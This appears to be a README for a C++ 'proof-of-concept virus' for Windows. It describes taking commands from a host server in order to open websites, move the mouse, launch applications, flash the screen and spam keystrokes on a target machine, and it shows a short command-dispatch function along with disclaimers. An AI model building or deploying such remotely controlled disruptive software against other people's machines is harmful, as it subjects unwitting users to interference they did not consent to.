Project Title: Remote Command Execution Virus

Overview

This project demonstrates a proof-of-concept virus designed for educational purposes. The program simulates malicious functionalities such as opening random websites, performing random mouse movements, launching random applications, flashing the screen with random colors, and spamming keyboard inputs. These actions are executed based on commands received from a host server.

Disclaimer: This project is strictly for educational purposes. Do not use this code for malicious activities. Unauthorized use of this program may violate laws and ethical guidelines.

Features

Command-Based Execution: Receives commands from a host server to execute specific functionalities.

Random Website Launcher: Opens random websites in the default browser.

Mouse Movement Simulation: Simulates random mouse movements.

Application Launcher: Randomly launches applications such as Notepad, Calculator, and Paint.

Screen Flashing: Flashes the screen with random colors.

Keyboard Spam: Simulates random keyboard input.

Getting Started

Prerequisites

Operating System: Windows

Tools:

Visual Studio or any C++ compiler

Winsock library (pre-installed on Windows)

Installation

Clone the repository:

git clone https://github.com/yourusername/remote-command-virus.git

Open the project in your preferred C++ IDE.

Build and compile the project.

Usage

Start the Server: Run the host server to send commands to the program.

Run the Program: Execute the compiled binary of the program on the target machine.

Send Commands: Use the server to send one of the following commands:

websites - Opens random websites.

mouse - Simulates random mouse movements.

app - Launches random applications.

flash - Flashes the screen with random colors.

keyboard - Spams random keyboard characters.

Code Highlights

Command Handling

The executeCommand function processes the commands received from the server and triggers the appropriate functionality.

void executeCommand(const string& command) {
    if (command == "websites") {
        openRandomWebsites();
    } else if (command == "mouse") {
        randomMouseMovement();
    } else if (command == "app") {
        randomAppLauncher();
    } else if (command == "flash") {
        screenFlashing();
    } else if (command == "keyboard") {
        keyboardSpam();
    } else {
        cout << "Unknown command: " << command << endl;
    }
}

Contributing

Contributions are welcome! Please follow these steps:

Fork the repository.

Create a new branch (feature-branch-name).

Commit your changes.

Push to the branch and open a pull request.

License

This project is licensed under the MIT License. See the LICENSE file for more details.

Acknowledgments

Inspired by ethical hacking and malware analysis projects.

Special thanks to the cybersecurity community for their guidance and insights.

Disclaimer

This project is intended for learning purposes only. The author is not responsible for any misuse or harm caused by this program.

